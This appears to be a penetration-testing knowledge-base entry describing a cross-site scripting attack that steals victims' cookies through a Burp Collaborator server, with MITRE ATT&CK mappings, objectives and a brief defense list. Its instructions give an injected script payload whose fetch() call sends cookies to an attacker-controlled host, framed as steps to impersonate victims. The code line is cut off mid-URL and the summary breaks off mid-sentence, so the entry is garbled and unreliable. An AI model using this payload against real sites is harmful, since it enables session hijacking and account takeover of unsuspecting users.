---
id: 09135cac-5909-453d-8f05-21c5b71e57f8
name: Cross Site Scripting (XSS) using Burp Collaborator to Steal Cookies
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:41.667205+00:00'
updated_at: '2023-04-10T20:21:29.215332+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[Scripting|T1064 - Scripting]]'
tags:
- '[[CORS]]'
- '[[Cross Site Scripting]]'
- '[[Exploit code or POC]]'
---

# Cross Site Scripting (XSS) using Burp Collaborator to Steal Cookies

## Summary

Cross-Site Scripting (XSS) is a type of injection attack where an attacker injects malicious code into a web page viewed by other users. In this case, the attacker uses a Burp Collaborator server to steal cookies from the victim's browser. The attacker can then use the stolen cookies to impersonate

## Description

# Description

Cross-Site Scripting (XSS) is a type of injection attack where an attacker injects malicious code into a web page viewed by other users. In this case, the attacker uses a Burp Collaborator server to steal cookies from the victim's browser. The attacker can then use the stolen cookies to impersonate the victim and gain access to sensitive information. To execute this attack, the attacker first finds a vulnerable web application that allows them to inject malicious code. They then inject the Burp Collaborator server script, which sends the stolen cookies to the attacker's server. This attack can be used for initial access and execution.

## Requirements

1. Access to a vulnerable web application

1. Burp Suite installed

1. Burp Collaborator server

## Defense

1. Implement input validation and sanitization to prevent XSS attacks

1. Use HttpOnly and Secure flags on cookies to prevent theft

1. Implement Content Security Policy (CSP) to restrict the sources of content that can be loaded on a web page

## Objectives

1. Steal cookies from the victim's browser

1. Impersonate the victim

1. Gain access to sensitive information

# Instructions

1. To use this command, replace <SESSION> with your Burp Collaborator session ID and inject the payload into a vulnerable web application. When a victim visits the page, their cookies will be sent to your Burp Collaborator server.

**Code**: [[<script>
  fetch('https://<SESSION>.burpcollaborat]]

> This command uses a payload to steal cookies from a victim's browser and send them to a Burp Collaborator server. The payload is injected into a vulnerable web application and when a victim visits the page, their cookies are sent to the specified Burp Collaborator server. The stolen cookies can then be used to impersonate the victim and gain unauthorized access to their account.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[Scripting|T1064 - Scripting]]

## Tags

- [[CORS]]
- [[Cross Site Scripting]]
- [[Exploit code or POC]]
